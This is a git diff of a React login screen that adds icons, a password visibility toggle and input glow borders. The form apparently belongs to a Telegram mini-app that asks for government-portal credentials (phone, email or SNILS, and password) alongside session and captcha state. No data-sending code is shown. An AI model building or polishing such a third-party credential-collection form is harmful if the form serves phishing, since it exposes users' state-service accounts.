@@ -5,6 +5,10 @@ import {
   ShieldCheck,
   Send,
   ArrowRight,
+  User,
+  Lock,
+  Eye,
+  EyeOff,
 } from 'lucide-react';
 
 declare global {
@@ -102,6 +106,7 @@ export default function App() {
   const [tgFirstName, setTgFirstName] = useState('');
   const [login, setLogin] = useState('');
   const [password, setPassword] = useState('');
+  const [showPassword, setShowPassword] = useState(false);
   const [sessionId, setSessionId] = useState('');
   const [userInput, setUserInput] = useState('');
   const [captchaImg, setCaptchaImg] = useState('');
@@ -406,40 +411,52 @@ export default function App() {
             </div>
           </div>
 
-          <div className="screen-body p-4">
-            <div className="form-fields--grouped">
+          <div className="screen-body">
+            <div className="form-fields">
               <div className="field-floating">
+                <User size={18} className="field-icon-left" />
                 <input
                   type="text"
-                  className="field-input input-enhanced"
+                  className="field-input input-enhanced input-with-icon-left"
                   value={login}
                   onChange={(e) => setLogin(e.target.value)}
                   placeholder=" "
                   autoComplete="username"
                   autoFocus
                 />
-                <label className="floating-label">
+                <label className="floating-label floating-label-with-icon">
                   Телефон, Email или СНИЛС
                 </label>
+                <svg className="input-glow-border">
+                  <rect pathLength={1} />
+                </svg>
               </div>
 
               <div className="field-floating">
+                <Lock size={18} className="field-icon-left" />
                 <input
-                  type="password"
-                  className="field-input input-enhanced"
+                  type={showPassword ? "text" : "password"}
+                  className="field-input input-enhanced input-with-icon-left input-with-icon-right"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
                   placeholder=" "
                   autoComplete="current-password"
                 />
-                <label className="floating-label">
+                <label className="floating-label floating-label-with-icon">
                   Пароль
                 </label>
+                <button
+                  type="button"
+                  className="field-toggle-right"
+                  onClick={() => setShowPassword(!showPassword)}
+                  tabIndex={-1}
+                >
+                  {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
+                </button>
+                <svg className="input-glow-border">
+                  <rect pathLength={1} />
+                </svg>
               </div>
-
-              <svg className="input-glow-border">
-                <rect pathLength={1} />
-              </svg>
             </div>
           </div>
 
